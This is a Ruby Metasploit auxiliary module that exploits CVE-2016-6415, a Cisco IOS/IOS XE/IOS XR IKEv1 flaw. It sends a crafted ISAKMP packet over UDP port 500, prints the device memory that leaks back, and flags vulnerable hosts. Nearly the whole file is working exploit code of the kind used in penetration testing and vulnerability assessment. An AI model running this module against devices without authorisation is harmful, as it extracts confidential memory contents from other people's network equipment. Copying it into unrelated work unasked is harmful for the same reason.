##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Auxiliary::Scanner
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Cisco IKE Information Disclosure',
      'Description'    => %q{
        A vulnerability in Internet Key Exchange version 1 (IKEv1) packet
        processing code in Cisco IOS, Cisco IOS XE, and Cisco IOS XR Software
        could allow an unauthenticated, remote attacker to retrieve memory
        contents, which could lead to the disclosure of confidential information.

        The vulnerability is due to insufficient condition checks in the part
        of the code that handles IKEv1 security negotiation requests.
        An attacker could exploit this vulnerability by sending a crafted IKEv1
        packet to an affected device configured to accept IKEv1 security
        negotiation requests. A successful exploit could allow the attacker
        to retrieve memory contents, which could lead to the disclosure of
        confidential information.
      },
      'Author'         => [ 'Nixawk' ],
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'CVE', '2016-6415' ],
          [ 'URL', 'https://github.com/adamcaudill/EquationGroupLeak/tree/master/Firewall/TOOLS/BenignCertain/benigncertain-v1110' ],
          [ 'URL', 'https://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20160916-ikev1' ],
          [ 'URL', 'https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-6415' ],
          [ 'URL', 'https://musalbas.com/2016/08/18/equation-group-benigncertain.html' ]
        ],
      'DisclosureDate' => 'Sep 29 2016'
    ))

    register_options(
      [
        Opt::RPORT(500),
        OptPath.new('PACKETFILE',
          [ true, 'The ISAKMP packet file', File.join(Msf::Config.data_directory, 'exploits', 'cve-2016-6415', 'sendpacket.raw') ])
      ])
  end

  def run_host(ip)
    begin
      isakmp_pkt = File.read(datastore['PACKETFILE'])
      peer = "#{ip}:#{datastore['RPORT']}"

      udp_sock = Rex::Socket::Udp.create(
        {
          'Context' => { 'Msf' => framework, 'MsfExploit' => self }
        }
      )

      add_socket(udp_sock)

      udp_sock.sendto(isakmp_pkt, ip, datastore['RPORT'].to_i)
      res = udp_sock.get(3)
      return unless res && res.length > 36 # ISAKMP + 36 -> Notitication Data...

      # Convert non-printable characters to periods
      printable_data = res.gsub(/[^[:print:]]/, '.')

      # Show abbreviated data
      vprint_status("Printable info leaked:\n#{printable_data}")

      chars = res.unpack('C*')
      len = (chars[30].to_s(16) + chars[31].to_s(16)).hex

      return if len <= 0
      print_good("#{peer} - IKE response with leak")
      report_vuln({
        :host => ip,
        :port => datastore['RPORT'],
        :proto => 'udp',
        :name => self.name,
        :refs => self.references,
        :info => "Vulnerable to Cisco IKE Information Disclosure"
      })

      # NETWORK may return the same packet data.
      return if res.length < 2500
      pkt_md5 = ::Rex::Text.md5(isakmp_pkt[isakmp_pkt.length-2500, isakmp_pkt.length])
      res_md5 = ::Rex::Text.md5(res[res.length-2500, res.length])

      print_warning("#{peer} - IKE response is same to payload data") if pkt_md5 == res_md5
    rescue
    ensure
      udp_sock.close
    end
  end
end
